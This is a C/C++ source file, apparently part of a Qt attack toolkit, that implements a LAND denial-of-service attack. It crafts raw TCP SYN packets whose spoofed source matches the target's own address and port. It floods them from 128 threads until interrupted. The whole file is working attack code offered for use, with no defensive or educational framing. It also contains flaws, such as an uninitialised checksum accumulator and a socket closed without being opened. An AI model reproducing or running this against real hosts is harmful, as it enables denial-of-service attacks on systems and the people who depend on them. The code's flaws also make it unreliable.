#include "landattack.h"
#include "attack.h"

extern QString getcurrenttime();

#define MAXCHILD 128

/* 程序活动标志 */
int alive_land = -1;
char dst_ip_land[20] = { 0 };
int dst_port_land;

#pragma pack(1)

struct pseudohdr_land
{
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
};

struct landnetinfo{
    char ip[32]={0x00};
    int port =445;
};

u_short check_sum(u_short * data,u_short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

void *sendlandattack(void *data)
{
    /* 处于活动状态时持续发送SYN包 */
    while(alive_land)
    {
        char ip[128] = "127.0.0.1";
        uint16_t port = 445;

        struct landnetinfo *snetinfo = (struct landnetinfo*)data;
        sprintf(ip, "%s", snetinfo->ip);
        port = snetinfo->port;


        struct sockaddr_in sin;
        struct hostent * hoste;
        int sockfd;
        char buffer[40];
        struct iphdr * ipheader=(struct iphdr *) buffer;
        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
        struct pseudohdr_land pseudoheader;

        fprintf(stderr,"land attack...\n");

        bzero(&sin,sizeof(struct sockaddr_in));
        sin.sin_family=AF_INET;

        if((hoste=gethostbyname(ip))!=NULL)
                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
        else if((sin.sin_addr.s_addr=inet_addr(ip))==-1)
        {
                fprintf(stderr,"unknown host %s\n",ip);
//                return(-1);
                return NULL;
        }

        if((sin.sin_port=htons(port))==0)
        {
                //fprintf(stderr,"unknown port %s\n",m_inputPort->text().toInt());
 //               return(-1);
                return NULL;
        }

        if((sockfd=socket(AF_INET,SOCK_RAW,255))==-1)
        {
                fprintf(stderr,"couldn't allocate raw socket\n");
 //               return(-1);
                return NULL;
        }

        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->version=4;
        ipheader->ihl=sizeof(struct iphdr)/4;
        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->id=htons(0xF1C);
        ipheader->ttl=255;
        ipheader->protocol=IPPROTO_TCP;//IP_TCP;

        ipheader->saddr=sin.sin_addr.s_addr;
        ipheader->daddr=sin.sin_addr.s_addr;

        tcpheader->th_sport=sin.sin_port;
        tcpheader->th_dport=sin.sin_port;
        tcpheader->th_seq=htonl(0xF1C);
        tcpheader->th_flags=TH_SYN;
        tcpheader->th_off=sizeof(struct tcphdr)/4;
        tcpheader->th_win=htons(2048);

        bzero(&pseudoheader,12+sizeof(struct tcphdr));
        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.protocol=6;
        pseudoheader.length=htons(sizeof(struct tcphdr));
        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
        tcpheader->th_sum=check_sum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

//        QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +" land attack...\n";
//        appendOutput(qmsg);
        if(sendto(sockfd,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
        {
                fprintf(stderr,"couldn't send packet\n");
//                return(-1);
                return NULL;
        }
    //    fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

        ::close(sockfd);
    }
}
/* 信号处理函数,设置退出变量alive */
void sig_int_land(int signo)//
{
    alive_land = signo;//0;
}

landattack::landattack()
{

}

void landattack::set_sig_int()//
{
    alive_land = 0;
}

int landattack::do_land(char *strip,int iport)
{
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive_land = 1;
    /* 截取信号CTRL+C */
    signal(SIGINT, sig_int_land);

    sprintf(dst_ip_land, "%s", strip);
    dst_port_land = iport;

    struct sockaddr_in sin;
    struct landnetinfo snetinfo;

    sprintf(snetinfo.ip, "%s", strip);
    snetinfo.port = iport;

//    struct hostent * hoste;
    int sockfd;

    /* 建立多个线程协同工作 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, sendlandattack, &snetinfo);
        if(err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
    }

    /* 等待线程结束 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if(err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }

    ::close(sockfd);
}

